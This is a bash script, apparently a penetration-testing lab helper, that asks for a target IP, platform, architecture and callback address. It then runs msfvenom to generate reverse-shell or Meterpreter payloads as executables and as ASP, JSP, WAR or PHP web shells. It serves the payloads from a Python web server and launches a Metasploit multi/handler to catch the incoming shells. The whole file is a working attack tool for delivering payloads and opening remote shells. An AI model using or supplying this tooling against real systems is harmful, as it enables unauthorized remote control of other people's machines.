#!/usr/bin/bash

read -p  'IP? > ' IP

flg0="0"

if [ -d /root/www/revshell/$IP ]; then
   echo ""
else
   mkdir /root/www/revshell/$IP
fi

if [ -d /root/Lab/$IP/sandbox ]; then
   echo ""
else
   mkdir /root/Lab/$IP/sandbox
fi

while [ "$flg0" = "0" ]
do
   script=""

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  'File Type (elf/exe/macho/asp/jsp/war/php) >' ftype

      if [ -z $ftype ] ; then
         echo "Input File Type"
      elif [ $ftype = 'elf' ] || [ $ftype = 'exe' ] || [ $ftype = 'macho' ]  || [ $ftype = 'asp' ] || [ $ftype = 'jsp' ] || [ $ftype = 'war' ] || [ $ftype = 'php' ] ; then
         flg="1"
      fi
   done

   if [ $ftype = 'elf' ] ; then
      os='l'
   fi
   if [ $ftype = 'exe' ] ; then
      os='w'
   fi
   if [ $ftype = 'macho' ] ; then
      os='m'
   fi
   if [ $ftype = 'asp' ] ; then
      os='w'
   fi
   if [ $ftype = 'jsp' ] ; then
      os='j'
   fi
   if [ $ftype = 'war' ] ; then
      os='j'
   fi
   if [ $ftype = 'php' ] ; then
      os='p'
   fi

#  flg=0

#   while [ "$flg" = "0" ]
#   do
#      read -p  'Windows or Linux or Mac or Java? (w/l/m/j) >' os
#
#      if [ -z $os ] ; then
#         echo "Input w or l or m or j"
#      elif [ $os = 'W' ] || [ $os = 'w' ] || [ $os = 'L' ]  || [ $os = 'l' ] || [ $os = 'M' ]  || [ $os = 'm' ] || [ $os = 'J' ]  || [ $os = 'j' ] ; then
#         flg="1"
#      fi
#   done

   if [ $ftype = 'elf' ] ; then
      os='l'
   fi
   if [ $ftype = 'exe' ] ; then
      os='w'
   fi
   if [ $ftype = 'macho' ] ; then
      os='m'
   fi
   if [ $ftype = 'asp' ] ; then
      os='w'
   fi
   if [ $ftype = 'jsp' ] ; then
      os='j'
   fi
   if [ $ftype = 'war' ] ; then
      os='j'
   fi
   if [ $ftype = 'php' ] ; then
      os='p'
   fi

   flg=0

   while [ "$flg" = "0" ]
   do
      echo '32bit:x86/i386/i686/IA-32' 
      echo '64bit:x64/x86_64/x86-64/AMD64/IA-64/Intel 64'
      read -p  'X86 or X64 (86/64) >' bit

      if [ -z $bit ] ; then
         echo "Input 86 or 64"
      elif [ $bit = '86' ] || [ $bit = '64' ] ; then
         flg="1"
      fi
   done

   flg=0

   ifconfig
   while [ "$flg" = "0" ]
   do
      read -p  'LHOST ? >' lhost

      if [ -z $lhost ] ; then
         echo "Input LHOST"
      else
         flg="1"
      fi
   done

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  'LPORT ? >' lport

      if [ -z $lport ] ; then
         echo "Input LPORT"
      else
         flg="1"
      fi
   done

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  "Shell or Meterpreter (s/m) >" payload

      if [ -z $payload ] ; then
         echo "Input s or m"
      elif [ $payload = 'S' ] || [ $payload = 's' ] || [ $payload = 'M' ]  || [ $payload = 'm' ] ; then
         flg="1"
      fi
   done

   if [ $os = "w" ] || [ $os = 'w' ] ; then
      if [ $bit = '86' ] ; then
         if [ $payload = "m" ] ; then
            if [ $ftype = "exe" ] ; then
               script1="msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > /root/www/revshell/$IP/win_86_meter_$lhost"_"$lport.exe"
               script2="cp /root/www/revshell/$IP/win_86_meter_$lhost"_"$lport.exe /root/Lab/$IP/sandbox/"
            elif [ $ftype = "asp" ] ; then 
               script1="msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f asp > /root/www/revshell/$IP/win_86_meter_$lhost"_"$lport.asp"
               script2="cp /root/www/revshell/$IP/win_86_meter_$lhost"_"$lport.asp /root/Lab/$IP/sandbox"	
            fi
         else
            if [ $ftype = "exe" ] ; then
               script1="msfvenom -p windows/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > /root/www/revshell/$IP/win_86_shell_$lhost"_"$lport.exe"
               script2="cp /root/www/revshell/$IP/win_86_shell_$lhost"_"$lport.exe /root/Lab/$IP/sandbox"	
            elif [ $ftype = "asp" ] ; then 
               script1="msfvenom -p windows/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f asp > /root/www/revshell/$IP/win_86_shell_$lhost"_"$lport.asp"
               script2="cp /root/www/revshell/$IP/win_86_shell_$lhost"_"$lport.asp /root/Lab/$IP/sandbox"	
            fi
         fi
      elif [ $bit = "64" ] ; then
         if [ $payload = "m" ] ; then
            if [ $ftype = "exe" ] ; then
               script1="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > /root/www/revshell/$IP/win_64_meter_$lhost"_"$lport.exe"
               script2="cp /root/www/revshell/$IP/win_64_meter_$lhost"_"$lport.exe /root/Lab/$IP/sandbox"	
            elif [ $ftype = "asp" ] ; then
               script1="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f asp > /root/www/revshell/$IP/win_64_meter_$lhost"_"$lport.asp"
               script2="cp /root/www/revshell/$IP/win_64_meter_$lhost"_"$lport.asp /root/Lab/$IP/sandbox"	
            fi
         else
            if [ $ftype = "exe" ] ; then
               script1="msfvenom -p windows/x64/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > /root/www/revshell/$IP/win_64_shell_$lhost"_"$lport.exe"
               script2="cp /root/www/revshell/$IP/win_64_shell_$lhost"_"$lport.exe /root/Lab/$IP/sandbox"	
            elif [ $ftype = "asp" ] ; then
               script1="msfvenom -p windows/x64/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f asp > /root/www/revshell/$IP/win_64_shell_$lhost"_"$lport.asp"
               script2="cp /root/www/revshell/$IP/win_64_shell_$lhost"_"$lport.asp /root/Lab/$IP/sandbox"	
            fi
         fi
      fi
   fi
         
   if [ $os = "L" ] || [ $os = 'l' ] ; then
      if [ $bit = '86' ] ; then
         if [ $payload = "m" ] ; then
            if [ $ftype = "elf" ] ; then
               script1="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > /root/www/revshell/$IP/linux_86_meter_$lhost"_"$lport.elf"
               script2="cp /root/www/revshell/$IP/linux_86_meter_$lhost"_"$lport.elf /root/Lab/$IP/sandbox"	
            fi
         else
            if [ $ftype = "elf" ] ; then
               script1="msfvenom -p linux/x86/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > /root/www/revshell/$IP/linux_86_shell_$lhost"_"$lport.elf"
               script2="cp /root/www/revshell/$IP/linux_86_shell_$lhost"_"$lport.elf /root/Lab/$IP/sandbox"	
            fi
         fi
      else   
         if [ $payload = "m" ] ; then
            if [ $ftype = "elf" ] ; then
               script1="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > /root/www/revshell/$IP/linux_64_meter_$lhost"_"$lport.elf"
               script2="cp /root/www/revshell/$IP/linux_64_meter_$lhost"_"$lport.elf /root/Lab/$IP/sandbox"	
            fi
         else
            if [ $ftype = "elf" ] ; then
               script1="msfvenom -p linux/x64/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > /root/www/revshell/$IP/linux_64_shell_$lhost"_"$lport.elf"
               script2="cp /root/www/revshell/$IP/linux_64_shell_$lhost"_"$lport.elf /root/Lab/$IP/sandbox"	
            fi
         fi
      fi
   fi
                  
   if [ $os = "J" ] || [ $os = 'j' ] ; then
      if [ $ftype = "jsp" ] ; then
         script1="msfvenom -p java/jsp_shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > /root/www/revshell/$IP/java_shell_$lhost"_"$lport.jsp"
         script2="cp /root/www/revshell/$IP/java_shell_$lhost"_"$lport.jsp /root/Lab/$IP/sandbox"	
      elif [ $ftype = "war" ] ; then
         script1="msfvenom -p java/jsp_shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f war > /root/www/revshell/$IP/java_shell_$lhost"_"$lport.war"
         script2="cp /root/www/revshell/$IP/java_shell_$lhost"_"$lport.war /root/Lab/$IP/sandbox"	
      fi
   fi
      
   if [ $os = "P" ] || [ $os = 'p' ] ; then
      if [ $ftype = "php" ] ; then
         if [ $payload = "m" ] ; then
            script1="msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > /root/www/revshell/$IP/php_meter_$lhost"_"$lport.php"
            script2="cp /root/www/revshell/$IP/php_meter_$lhost"_"$lport.php /root/Lab/$IP/sandbox"	
         elif [ $payload = "s" ] ; then
            script1="msfvenom -p php/reverse_php LHOST="$lhost" LPORT="$lport" -f raw > /root/www/revshell/$IP/php_shell_$lhost"_"$lport.php"
            script2="cp /root/www/revshell/$IP/php_shell_$lhost"_"$lport.php /root/Lab/$IP/sandbox"	         
         fi
      fi
   fi

   if [ "$script1" = "" ] ; then
      read -p "Generation Faild. Option Combination is Bad. Retry? > " retry
      if [ $retry = "Y" ] || [ $retry = "y" ] ; then
         echo ""
      else
         flg0=1
      fi
   else
      rm /root/Lab/$IP/sandbox/revshell.sh
      touch /root/Lab/$IP/sandbox/revshell.sh
#        echo "#!/bin/bash" > revshell.sh
      echo $script1 >> /root/Lab/$IP/sandbox/revshell.sh
      echo $script2 >> /root/Lab/$IP/sandbox/revshell.sh
      cat /root/Lab/$IP/sandbox/revshell.sh
      chmod 777 /root/Lab/$IP/sandbox/revshell.sh
      /root/Lab/$IP/sandbox/revshell.sh
      flg0=1      
   fi   
done

flg=0
input=""
rm /root/Lab/$IP/sandbox/temp.sh
touch /root/Lab/$IP/sandbox/temp.sh

while [ "$flg" = "0" ]
do
   read -p "Start python web server? > " input
   if [ -z $input ] ; then
      echo "Input Y or N"
   elif [ $input = 'Y' ] || [ $input = 'y' ] || [ $input = 'N' ]  || [ $input = 'n' ] ; then
      flg="1"
   fi
done

if [ $input = 'Y' ] || [ $input = 'y' ] ; then
   read -p "What port? > " input2
   echo "cd /root/www" >> /root/Lab/$IP/sandbox/temp.sh
   echo "python3 -m http.server $input2" >> /root/Lab/$IP/sandbox/temp.sh
fi 

flg=0
input=""

while [ "$flg" = "0" ]
do
   read -p "Start multi/handler? > " input
   if [ -z $input ] ; then
      echo "Input Y or N"
   elif [ $input = 'Y' ] || [ $input = 'y' ] || [ $input = 'N' ]  || [ $input = 'n' ] ; then
      flg="1"
   fi
done

if [ $input = 'Y' ] || [ $input = 'y' ] ; then
   rm /root/Lab/$IP/sandbox/multi_handler.rc
   touch /root/Lab/$IP/sandbox/multi_handler.rc
   echo "use exploit/multi/handler" >> /root/Lab/$IP/sandbox/multi_handler.rc
   echo "set PAYLOAD "$(head -n 1 /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f3) >> /root/Lab/$IP/sandbox/multi_handler.rc
   echo "set LHOST "$lhost >> /root/Lab/$IP/sandbox/multi_handler.rc
   echo "set LPORT "$lport >> /root/Lab/$IP/sandbox/multi_handler.rc
   echo "set ExitOnSession false" >> /root/Lab/$IP/sandbox/multi_handler.rc
   echo "exploit -j -z" >> /root/Lab/$IP/sandbox/multi_handler.rc
   cat /root/Lab/$IP/sandbox/multi_handler.rc
   echo "msfconsole -r /root/Lab/$IP/sandbox/multi_handler.rc" >> /root/Lab/$IP/sandbox/temp.sh
fi
chmod 777 /root/Lab/$IP/sandbox/temp.sh
/root/Lab/$IP/sandbox/temp.sh
